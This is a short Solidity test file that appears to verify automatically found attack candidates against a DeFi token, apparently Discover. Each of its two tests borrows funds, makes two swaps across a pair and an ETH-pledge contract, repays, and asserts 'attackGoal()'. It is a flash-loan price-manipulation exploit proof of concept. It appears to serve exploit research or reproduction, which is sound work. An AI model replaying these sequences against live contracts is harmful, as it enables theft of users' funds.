// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;
import "./Discover.t.sol";

contract DiscoverVerify is DiscoverTest {
    function test_verify_cand001_0() public {
        uint256 amt0 = 0x103f08008a00800000002;
        uint256 amt1 = 0x3aa8259ef6e9da00005;
        uint256 amt2 = 0x757d87e1e024a6ef59b2;
        uint256 amt3 = 0x103f4673c028f142005dc;
        borrow_usdt(amt0);
        swap_ethpledge_usdt_disc(amt1);
        swap_pair_disc_usdt(amt2);
        payback_usdt(amt3);
        require(attackGoal(), "Attack failed!");
    }

    function test_verify_cand003_0() public {
        uint256 amt0 = 0x101fdc0000000000000000;
        uint256 amt1 = 0x45cda7e1e064a6ef59b2;
        uint256 amt2 = 0x2efc000000000000000;
        uint256 amt3 = 0x101fdfe7336287142005da;
        borrow_disc(amt0);
        swap_pair_disc_usdt(amt1);
        swap_ethpledge_usdt_disc(amt2);
        payback_disc(amt3);
        require(attackGoal(), "Attack failed!");
    }
}
